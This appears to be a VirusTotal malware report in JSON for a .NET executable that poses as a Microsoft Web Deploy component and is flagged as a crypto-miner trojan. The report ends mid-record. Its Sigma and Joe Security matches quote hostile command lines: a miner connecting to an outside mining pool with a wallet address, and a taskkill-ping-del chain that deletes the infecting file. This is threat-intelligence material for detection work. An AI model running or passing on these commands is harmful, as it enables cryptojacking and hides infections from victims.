{
    "data": {
        "id": "31628bbea1418e7349ec8ddb7990624db3ded143b45f27b807539ab7b5ddedae",
        "type": "file",
        "links": {
            "self": "https://www.virustotal.com/api/v3/files/31628bbea1418e7349ec8ddb7990624db3ded143b45f27b807539ab7b5ddedae"
        },
        "attributes": {
            "signature_info": {
                "description": "Microsoft Web Platform Extensions",
                "file version": "7.1.9",
                "original name": "cc.exe",
                "product": "Microsoft Web Platform Extensions",
                "comments": "Web Deploy",
                "internal name": "cc.exe",
                "copyright": "Copyright (c) Microsoft Corporation. All rights reserved."
            },
            "packers": {
                "PEiD": ".NET executable"
            },
            "type_extension": "exe",
            "pe_info": {
                "timestamp": 1396067646,
                "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
                "machine_type": 332,
                "entry_point": 1753006,
                "resource_details": [
                    {
                        "lang": "NEUTRAL",
                        "chi2": 24328.58,
                        "filetype": "unknown",
                        "entropy": 6.1471638679504395,
                        "sha256": "ba09328e9041c4099759f1ca2570568493e7b5142ca54e4096f950cbd3a8c8c7",
                        "type": "RT_ICON"
                    },
                    {
                        "lang": "NEUTRAL",
                        "chi2": 238561.83,
                        "filetype": "unknown",
                        "entropy": 6.081759452819824,
                        "sha256": "16f4a4194451212dec9192d79819cb874b1508e7d0b91e0c6faeaa3a921f78fb",
                        "type": "RT_ICON"
                    },
                    {
                        "lang": "NEUTRAL",
                        "chi2": 2263.39,
                        "filetype": "PNG",
                        "entropy": 7.975648880004883,
                        "sha256": "5d11c9426ba3bd21f86afe23ff76b96f01e860ede056af34e60addc52fcc4af5",
                        "type": "RT_ICON"
                    },
                    {
                        "lang": "NEUTRAL",
                        "chi2": 93676.62,
                        "filetype": "unknown",
                        "entropy": 6.183669090270996,
                        "sha256": "1386132afc1585425ba6db19b383fc4e04530aa3d64d8a4f42f6363c06c3682e",
                        "type": "RT_ICON"
                    },
                    {
                        "lang": "NEUTRAL",
                        "chi2": 1824674.88,
                        "filetype": "unknown",
                        "entropy": 5.936393737792969,
                        "sha256": "f4df6ed23f9e3230790df6e6cae60ebc71ad095e89eee0f4c74d30e9e07ab3cd",
                        "type": "RT_ICON"
                    },
                    {
                        "lang": "NEUTRAL",
                        "chi2": 5771.58,
                        "filetype": "ICO",
                        "entropy": 2.7356247901916504,
                        "sha256": "03713fd1e4833ad06fc90d070d1caa9d983e7fda2efbbb7fc1f0a5c1f379a716",
                        "type": "RT_GROUP_ICON"
                    },
                    {
                        "lang": "NEUTRAL",
                        "chi2": 75140.72,
                        "filetype": "unknown",
                        "entropy": 3.3890128135681152,
                        "sha256": "d9270f94fcce6898e48c03044b533d5d4f86d1223466a522c00eac55f55700c8",
                        "type": "RT_VERSION"
                    }
                ],
                "resource_langs": {
                    "NEUTRAL": 7
                },
                "resource_types": {
                    "RT_ICON": 5,
                    "RT_VERSION": 1,
                    "RT_GROUP_ICON": 1
                },
                "sections": [
                    {
                        "name": ".text",
                        "chi2": 6388.94,
                        "virtual_address": 8192,
                        "entropy": 8.0,
                        "raw_size": 1744896,
                        "flags": "rx",
                        "virtual_size": 1744820,
                        "md5": "d7c41a2d7b0c99cacba6c96696437073"
                    },
                    {
                        "name": ".rsrc",
                        "chi2": 1391756.5,
                        "virtual_address": 1753088,
                        "entropy": 7.0,
                        "raw_size": 142336,
                        "flags": "r",
                        "virtual_size": 142304,
                        "md5": "caaa8b08092b633f538d1cc40850d642"
                    },
                    {
                        "name": ".reloc",
                        "chi2": 128016.0,
                        "virtual_address": 1900544,
                        "entropy": 0.1,
                        "raw_size": 512,
                        "flags": "r",
                        "virtual_size": 12,
                        "md5": "7851dcf2fea0eb43ffa22546127a2741"
                    }
                ],
                "import_list": [
                    {
                        "library_name": "mscoree.dll",
                        "imported_functions": [
                            "_CorExeMain"
                        ]
                    }
                ]
            },
            "crowdsourced_ids_stats": {
                "high": 0,
                "info": 0,
                "medium": 1,
                "low": 0
            },
            "dot_net_guids": {
                "mvid": "bd6f8ebf-c9f3-4ee3-a925-409eb6a11a1d"
            },
            "total_votes": {
                "harmless": 0,
                "malicious": 0
            },
            "last_analysis_date": 1742874545,
            "last_modification_date": 1746402719,
            "creation_date": 1396067646,
            "meaningful_name": "cc.exe",
            "sha256": "31628bbea1418e7349ec8ddb7990624db3ded143b45f27b807539ab7b5ddedae",
            "sha1": "7221ec70115eccbdd9bad9e6a48c4f33eb9f7dba",
            "dot_net_assembly": {
                "entry_point_rva": 19544,
                "metadata_header_rva": 1740248,
                "assembly_name": "cc.exe",
                "resources_va": 1720704,
                "assembly_flags": 3,
                "strongname_va": 0,
                "external_assemblies": {
                    "": {
                        "version": "803.1096.256.111"
                    },
                    "r": {
                        "version": "317.424.593.626"
                    },
                    "asmAttribute": {
                        "version": "1389.1483.1524.1578"
                    },
                    "ry": {
                        "version": "929.1004.1030.1045"
                    }
                },
                "entry_point_token": 100663298,
                "tables_rows_map": "15f2b05706b5c5c0a924301701c00000001131f0010040000310000",
                "streams": {
                    "#GUID": {
                        "chi2": 240.0,
                        "md5": "c4c33daa0477043024e7c5309df84500",
                        "entropy": 4.0,
                        "size": 16
                    },
                    "#Blob": {
                        "chi2": 20089.5,
                        "md5": "e95be48955be0360249fff987ac4d8b3",
                        "entropy": 5.379110813140869,
                        "size": 2048
                    },
                    "#US": {
                        "chi2": 6385.9140625,
                        "md5": "b554575879c7314da3750473072a980f",
                        "entropy": 3.083890676498413,
                        "size": 92
                    },
                    "#~": {
                        "chi2": 208924.296875,
                        "md5": "0ef0703e7ab9d1d4ab22ff24623a33a5",
                        "entropy": 5.142191410064697,
                        "size": 5912
                    },
                    "#Strings": {
                        "chi2": 48165.04296875,
                        "md5": "5501d57ac18bca10b228f9324ae1b828",
                        "entropy": 4.988542079925537,
                        "size": 4504
                    }
                },
                "tables_present": 22,
                "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
                "assembly_data": {
                    "majorversion": 0,
                    "minorversion": 40,
                    "hashalgid": 4980737,
                    "buildnumber": 1,
                    "culture": "Info",
                    "flags": 2818048,
                    "revisionnumber": 475,
                    "name": "pDomain"
                },
                "clr_version": "v2.0.50727",
                "tables_present_map": "3093e02ddd7",
                "manifest_resource": [
                    "System",
                    "em",
                    "stem"
                ],
                "clr_meta_version": "1.1",
                "tables_rows_map_log": "4878888948467445464556",
                "type_definition_list": [
                    {
                        "namespace": "System.Runtime.CompilerServices",
                        "type_definitions": [
                            "SuppressIldasmAttribute",
                            "RuntimeHelpers",
                            "CompilationRelaxationsAttribute",
                            "RuntimeCompatibilityAttribute"
                        ]
                    },
                    {
                        "namespace": "System",
                        "type_definitions": [
                            "Object",
                            "STAThreadAttribute",
                            "EventArgs",
                            "AppDomain",
                            "Type",
                            "RuntimeTypeHandle",
                            "String",
                            "ValueType",
                            "Version",
                            "Char",
                            "Attribute",
                            "AttributeUsageAttribute",
                            "AttributeTargets",
                            "MulticastDelegate",
                            "IAsyncResult",
                            "AsyncCallback",
                            "ModuleHandle",
                            "Delegate",
                            "RuntimeMethodHandle",
                            "Exception",
                            "Array",
                            "RuntimeFieldHandle",
                            "Int32",
                            "ResolveEventHandler",
                            "ResolveEventArgs",
                            "Convert",
                            "Byte",
                            "IDisposable",
                            "Math",
                            "Int16",
                            "EventHandler",
                            "InvalidOperationException",
                            "ArgumentOutOfRangeException",
                            "BadImageFormatException",
                            "FormatException"
                        ]
                    },
                    {
                        "namespace": "System.Windows.Forms",
                        "type_definitions": [
                            "Application",
                            "Form",
                            "BindingSource",
                            "Button",
                            "Control"
                        ]
                    },
                    {
                        "namespace": "System.ComponentModel",
                        "type_definitions": [
                            "IContainer",
                            "ISupportInitialize",
                            "Container"
                        ]
                    },
                    {
                        "namespace": "System.Drawing",
                        "type_definitions": [
                            "Bitmap",
                            "Color",
                            "Image"
                        ]
                    },
                    {
                        "namespace": "System.IO",
                        "type_definitions": [
                            "Stream",
                            "FileStream",
                            "Path",
                            "Directory",
                            "DirectoryInfo",
                            "File",
                            "FileLoadException",
                            "MemoryStream"
                        ]
                    },
                    {
                        "namespace": "System.Reflection",
                        "type_definitions": [
                            "Assembly",
                            "MethodInfo",
                            "MethodBase",
                            "FieldInfo",
                            "ParameterInfo",
                            "BindingFlags",
                            "MemberInfo",
                            "Module",
                            "AssemblyName",
                            "AssemblyProductAttribute",
                            "AssemblyTrademarkAttribute",
                            "AssemblyDescriptionAttribute",
                            "AssemblyFileVersionAttribute",
                            "AssemblyCopyrightAttribute",
                            "AssemblyCompanyAttribute",
                            "AssemblyTitleAttribute"
                        ]
                    },
                    {
                        "namespace": "System.Resources",
                        "type_definitions": [
                            "ResourceManager"
                        ]
                    },
                    {
                        "namespace": "System.Text",
                        "type_definitions": [
                            "Encoding",
                            "StringBuilder"
                        ]
                    },
                    {
                        "namespace": "System.Collections.Generic",
                        "type_definitions": [
                            "Dictionary`2",
                            "List`1",
                            "IEnumerable`1"
                        ]
                    },
                    {
                        "namespace": "System.Diagnostics",
                        "type_definitions": [
                            "Process",
                            "ProcessModule",
                            "StackFrame",
                            "StackTrace"
                        ]
                    },
                    {
                        "namespace": "System.Reflection.Emit",
                        "type_definitions": [
                            "DynamicMethod",
                            "ILGenerator",
                            "OpCodes",
                            "OpCode"
                        ]
                    },
                    {
                        "namespace": "System.Threading",
                        "type_definitions": [
                            "Monitor"
                        ]
                    },
                    {
                        "namespace": "System.Security.Cryptography",
                        "type_definitions": [
                            "DESCryptoServiceProvider",
                            "ICryptoTransform",
                            "SymmetricAlgorithm",
                            "RijndaelManaged"
                        ]
                    },
                    {
                        "namespace": "uncategorized",
                        "type_definitions": [
                            "ControlCollection"
                        ]
                    },
                    {
                        "namespace": "System.Security",
                        "type_definitions": [
                            "UnverifiableCodeAttribute"
                        ]
                    }
                ]
            },
            "tlsh": "T1CC95337D7384D3A1C9CE95FDDD16DA4982B0B3C44C53C32938C5F2566AA239CD9A8B0B",
            "tags": [
                "peexe",
                "spreader",
                "persistence",
                "checks-user-input",
                "detect-debug-environment",
                "long-sleeps",
                "calls-wmi",
                "assembly"
            ],
            "names": [
                "cc.exe",
                "mCggnszw.exe",
                "unknown",
                "myfile.exe",
                "2026378884.smart-cleaned.exe",
                "smart-cleaned.exe",
                "4641b879721c032c32c244223461b4b15d6bc1aa02ec481ff98dd6c347b48cc7-1396068078",
                "aa",
                "s4zHrCniSe.html",
                "gGPZCm.xlsb"
            ],
            "magika": "PEBIN",
            "type_tags": [
                "executable",
                "windows",
                "win32",
                "pe",
                "peexe"
            ],
            "sandbox_verdicts": {
                "Zenbox": {
                    "category": "malicious",
                    "confidence": 100,
                    "sandbox_name": "Zenbox",
                    "malware_classification": [
                        "MALWARE",
                        "SPREADER",
                        "TROJAN",
                        "EVADER"
                    ],
                    "malware_names": [
                        "Diablo Miner",
                        "GMiner"
                    ]
                },
                "SecneurX": {
                    "category": "malicious",
                    "sandbox_name": "SecneurX",
                    "malware_classification": [
                        "MALWARE"
                    ]
                }
            },
            "type_tag": "peexe",
            "times_submitted": 6,
            "last_analysis_stats": {
                "malicious": 53,
                "suspicious": 0,
                "undetected": 20,
                "harmless": 0,
                "timeout": 0,
                "confirmed-timeout": 0,
                "failure": 0,
                "type-unsupported": 4
            },
            "sigma_analysis_results": [
                {
                    "rule_level": "critical",
                    "rule_id": "c9f2b527fcecda6141fde1caee187052676355bc055141a8caa6c22482fca3ad",
                    "rule_source": "Joe Security Rule Set (GitHub)",
                    "rule_title": "Xmrig",
                    "rule_description": "Detect Xmrig",
                    "rule_author": "Joe Security",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6565-638F-780A-000000004700}",
                                "ProcessId": "3124",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-655F-638F-700A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "6000",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670341989",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6573-638F-860A-000000004700}",
                                "ProcessId": "2388",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656E-638F-7E0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "2592",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670342003",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657C-638F-910A-000000004700}",
                                "ProcessId": "252",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6576-638F-890A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "2980",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670342012",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "EventID": "1"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "critical",
                    "rule_id": "ca9a79f8e23430115778a41aa4671433713b393278e1a60331cbb991a0f30f82",
                    "rule_source": "Joe Security Rule Set (GitHub)",
                    "rule_title": "Copy itself to suspicious location via type command",
                    "rule_description": "Copy itself to suspicious location via type command",
                    "rule_author": "Joe Security",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6571-638F-820A-000000004700}",
                                "ProcessId": "6180",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656C-638F-7D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1676",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342001",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657A-638F-8D0A-000000004700}",
                                "ProcessId": "1936",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6574-638F-880A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "6520",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342010",
                                "RuleName": "-"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "high",
                    "rule_id": "25fc56c1bee673d7ff3edcf371e4d2a36c0af83222da348961b87735c8efa61f",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "System File Execution Location Anomaly",
                    "rule_description": "Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.\n",
                    "rule_author": "Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
                    "match_context": [
                        {
                            "values": {
                                "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe",
                                "Image": "\\??\\C:\\Windows\\system32\\conhost.exe",
                                "EventID": "1"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "high",
                    "rule_id": "2e58fcf707ea25a6c7465ae2a0d4b35ff302cceb7b8fde4ac5d3467d832e005e",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Suspicious Ping And Del Combination",
                    "rule_description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
                    "rule_author": "Ilya Krestinichev",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6563-638F-740A-000000004700}",
                                "ProcessId": "7048",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6558-638F-6D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1368",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"software.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\Desktop\\software.exe\" & del /f /q \"C:\\Users\\george\\Desktop\\software.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "UtcTime": "1670341987",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6571-638F-820A-000000004700}",
                                "ProcessId": "6180",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656C-638F-7D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1676",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342001",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657A-638F-8D0A-000000004700}",
                                "ProcessId": "1936",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6574-638F-880A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "6520",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342010",
                                "RuleName": "-"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "high",
                    "rule_id": "6bbafdf03b2a79de4fa71f3fec777333b907de6172939c7a35b5bed23d4a4b82",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Windows Crypto Mining Indicators",
                    "rule_description": "Detects command line parameters or strings often used by crypto miners",
                    "rule_author": "Florian Roth",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6565-638F-780A-000000004700}",
                                "ProcessId": "3124",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-655F-638F-700A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "6000",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670341989",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6573-638F-860A-000000004700}",
                                "ProcessId": "2388",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656E-638F-7E0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "2592",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
